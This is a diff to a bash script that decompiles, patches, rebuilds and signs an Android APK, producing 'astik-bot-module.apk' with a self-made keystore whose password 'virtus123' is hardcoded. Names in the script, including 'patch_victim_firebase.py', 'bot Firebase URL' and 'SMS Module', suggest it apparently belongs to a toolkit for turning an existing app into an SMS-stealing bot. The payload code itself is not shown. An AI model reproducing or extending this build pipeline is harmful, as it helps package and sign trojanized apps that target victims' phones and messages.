@@ -4,7 +4,6 @@ set -euo pipefail
 ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 cd "$ROOT"
 
-# Astik-style APK — config from Firebase config/{KEY} (no BotConfigSync)
 if [ -f "$ROOT/../.env" ]; then
   set -a
   # shellcheck disable=SC1091
@@ -12,19 +11,34 @@ if [ -f "$ROOT/../.env" ]; then
   set +a
 fi
 
-APKTOOL="${APKTOOL:-/workspace/apktool.jar}"
+APKTOOL="${APKTOOL:-$ROOT/apktool.jar}"
 SIGNER="${SIGNER:-$ROOT/uber-apk-signer.jar}"
 
-echo "Building Virtus SMS Module APK..."
-python3 "$ROOT/patch_astik_flow.py"
-python3 "$ROOT/patch_victim_firebase.py"
-python3 "$ROOT/generate_icons.py"
+if [ ! -f "$APKTOOL" ]; then
+  echo "Downloading apktool..."
+  curl -fsSL -o "$APKTOOL" \
+    "https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar"
+fi
+
+echo "Building Astik-base APK (bot Firebase URL only)..."
+python3 "$ROOT/build_astik_minimal.py"
 java -jar "$APKTOOL" b virtus_decompiled -o virtus-unsigned.apk
 
 if [ ! -f "$SIGNER" ]; then
   echo "Downloading uber-apk-signer..."
   curl -fsSL -o "$SIGNER" \
     "https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar"
+fi
+
+KEYSTORE="$ROOT/virtus.keystore"
+if [ ! -f "$KEYSTORE" ]; then
+  echo "Creating virtus.keystore..."
+  keytool -genkeypair -v \
+    -keystore "$KEYSTORE" \
+    -alias virtus \
+    -keyalg RSA -keysize 2048 -validity 10000 \
+    -storepass virtus123 -keypass virtus123 \
+    -dname "CN=Virtus Module, OU=APK, O=Virtus, L=NA, ST=NA, C=IN"
 fi
 
 java -jar "$SIGNER" \
@@ -37,4 +51,5 @@ java -jar "$SIGNER" \
   --overwrite
 
 cp virtus-unsigned.apk virtus-sms-module.apk
-echo "Done: $ROOT/virtus-sms-module.apk (v2/v3 signed + zipaligned)"
+cp virtus-unsigned.apk astik-bot-module.apk
+echo "Done: astik-bot-module.apk (com.astik.module — Astik exact + bot Firebase)"
